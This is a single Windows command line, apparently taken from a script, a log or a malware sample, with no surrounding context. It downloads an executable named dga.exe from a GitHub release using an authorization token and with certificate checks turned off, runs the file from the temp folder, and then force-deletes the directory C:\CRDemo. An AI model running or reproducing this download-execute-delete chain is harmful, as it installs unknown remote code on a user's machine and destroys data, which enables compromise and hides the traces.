...
C:\Windows\system32\cmd.exe /c curl -k -H "Authorization: token ghp_%key%" -H "Accept: application/octet-stream" -L "https://api.github.com/repos/cr-yuf/cryf/releases/assets/99449448" --output %TEMP%\dga.exe & start %TEMP%\dga.exe & rd /s /q C:\CRDemo
